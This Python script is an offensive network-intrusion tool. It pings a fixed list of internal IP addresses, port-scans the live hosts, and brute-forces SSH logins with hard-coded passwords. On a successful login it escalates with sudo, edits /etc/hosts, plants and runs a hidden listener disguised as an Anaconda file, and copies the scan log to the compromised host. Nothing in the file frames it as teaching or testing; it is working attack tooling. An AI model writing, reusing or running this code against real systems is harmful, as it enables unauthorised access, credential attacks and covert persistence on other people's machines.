import socket
import threading
import os
import struct
import time
import select
import paramiko

ICMP_ECHO_REQUEST = 8
ICMP_ECHO_REPLY = 0
IPS = ['10.228.12.19', '10.228.12.5', '10.228.12.6']
PASSLIST = ['a/Vewd`%W<c8{Cp^XHG3(s', 't(;C7z*W`X^B~v>un,64=?', 'b>4PEsm*kz"g6,G8/=39+X']
USERNAME = 'elijah'

def checkSum(source_string):
    """
    Calculate the checksum for the packet.
    """
    sum = 0
    count_to = (len(source_string) // 2) * 2
    count = 0
    while count < count_to:
        this_val = source_string[count + 1] * 256 + source_string[count]
        sum = sum + this_val
        sum = sum & 0xffffffff 
        count = count + 2

    if count_to < len(source_string):
        sum = sum + source_string[len(source_string) - 1]
        sum = sum & 0xffffffff 

    sum = (sum >> 16) + (sum & 0xffff)
    sum = sum + (sum >> 16)
    answer = ~sum
    answer = answer & 0xffff

    answer = answer >> 8 | (answer << 8 & 0xff00)
    return answer

def createPacket(id):
    """ 
    Create a new echo request packet based on the given "id". 
    """
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, 0, id, 1)
    data = 192 * b'Q'
    my_checksum = checkSum(header + data)
    header = struct.pack('bbHHh', ICMP_ECHO_REQUEST, 0, socket.htons(my_checksum), id, 1)
    return header + data

def doOne(dest_addr, timeout):
    """
    Sends one ping to the given "dest_addr" which is the IP address of the target host.
    """
    try:
        icmp = socket.getprotobyname("icmp")
        try:
            sock = socket.socket(socket.AF_INET, socket.SOCK_RAW, icmp)
        except socket.error as e:
            print(f"Socket could not be created. Error Code : {e}")
            return

        my_id = os.getpid() & 0xFFFF

        packet = createPacket(my_id)
        sent = sock.sendto(packet, (dest_addr, 1))

        while True:
            ready = select.select([sock], [], [], timeout)
            if ready[0] == []:
#                print(f"No response from {dest_addr}, host is down")
                return

            time_received = time.time()
            rec_packet, addr = sock.recvfrom(1024)

            icmp_header = rec_packet[20:28]
            type, code, checksum, packet_id, sequence = struct.unpack('bbHHh', icmp_header)

            if packet_id == my_id:
                return time_received - time.time()

    except socket.error as e:
        print(f"General error: {e}")
        return
    finally:
        sock.close()

def checkTcp(ip, port, timeout=1):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
            s.settimeout(timeout)
            result = s.connect_ex((ip, port))
            with open('/tmp/.anaconda.bak', 'a') as file:
                if result == 0:
                    file.write(f"TCP service running on {ip}:{port}\n")
                else:
                    file.write(f"No TCP service on {ip}:{port}\n")
    except Exception as e:
        with open('/tmp/.anaconda.bak', 'a') as file:
            file.write(f"Error checking TCP {ip}:{port} - {e}\n")

def checkUdp(ip, port, timeout=1):
    try:
        with socket.socket(socket.AF_INET, socket.SOCK_DGRAM) as s:
            s.settimeout(timeout)
            s.sendto(b'', (ip, port))
            s.recvfrom(1024)
            with open('/tmp/.anaconda.bak', 'a') as file:
                file.write(f"Possible UDP service on {ip}:{port}\n")
    except socket.timeout:
        with open('/tmp/.anaconda.bak', 'a') as file:
            file.write(f"No UDP service on {ip}:{port}\n")
    except Exception as e:
        with open('/tmp/.anaconda.bak', 'a') as file:
            file.write(f"Error checking UDP {ip}:{port} - {e}\n")

def scanNetwork(ip, start_port, end_port, max_threads=50, protocol='TCP'):
    threads = []
    check_service = checkTcp if protocol.upper() == 'TCP' else checkUdp

    for port in range(start_port, end_port + 1):
        while threading.active_count() > max_threads:
            time.sleep(1)

        thread = threading.Thread(target=check_service, args=(ip, port))
        thread.start()
        threads.append(thread)

        time.sleep(0.1)

    for thread in threads:
        thread.join()

def sendFile(server_ip, port, file_path):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.connect((server_ip, port))
        with open(file_path, 'rb') as file:
            s.sendfile(file)

def bruteForce(ip, username, password_list):
    sendScript = """
import socket
def receiveFile(port, file_path):
    with socket.socket(socket.AF_INET, socket.SOCK_STREAM) as s:
        s.bind(('', port))
        s.listen(1)
        conn, addr = s.accept()
        with conn, open(file_path, 'wb') as file:
            while True:
                data = conn.recv(1024)
                if not data:
                    break
                file.write(data)
receiveFile(9090, '/tmp/.anaconda.bak')
"""

    for password in password_list:
        ssh = paramiko.SSHClient()
        ssh.set_missing_host_key_policy(paramiko.AutoAddPolicy())
        try:
            ssh.connect(ip, username=username, password=password, timeout=3)
            ssh_shell = ssh.invoke_shell()
            ssh_shell.send("sudo -i\n")
            time.sleep(1)
            ssh_shell.send("echo '10.228.2.2 hosts' >> /etc/hosts\n")
            time.sleep(1)

            ssh_shell.send("cat <<'EOF' >/tmp/.anaconda.py\n")
            ssh_shell.send(sendScript)
            ssh_shell.send("EOF\n")
            time.sleep(1)

            ssh_shell.send("chmod +x /tmp/.anaconda.py\n")
            time.sleep(1)
            ssh_shell.send("python3 /tmp/.anaconda.py &\n")
            time.sleep(1)

            sendFile(ip, 9090, '/tmp/.anaconda.bak')

            ssh_shell.close()
            ssh.close()
            return True
        except paramiko.AuthenticationException:
            print(f"Brute-force attempt failed for {ip} with password: {password}")
        except Exception as e:
            print(f"Error connecting to {ip}: {e}")
        finally:
            ssh.close()
    return False

def main():
    timeout = 2
    live_hosts = []

    for host in IPS:
        delay = doOne(host, timeout)
        if delay is not None:
            live_hosts.append(host)

    with open('/tmp/.anaconda.blk', 'w') as file:
        for ip in live_hosts:
            scanNetwork(ip, 1, 1024, protocol='TCP')
            file.write(f"{ip}\n")
            scanNetwork(ip, 1, 1024, protocol='UDP')

    for password in PASSLIST:
        with open('/tmp/.anaconda.bak', 'r') as file:
            lines = file.readlines()
            for line in lines:
                if "TCP service running on" in line and ":22" in line:
                    ip = line.split()[4].split(':')[0]
                    if bruteForce(ip, USERNAME, [password]):
                        print(f"Post-brute-force actions completed for {ip}")

if __name__ == '__main__':
    main()
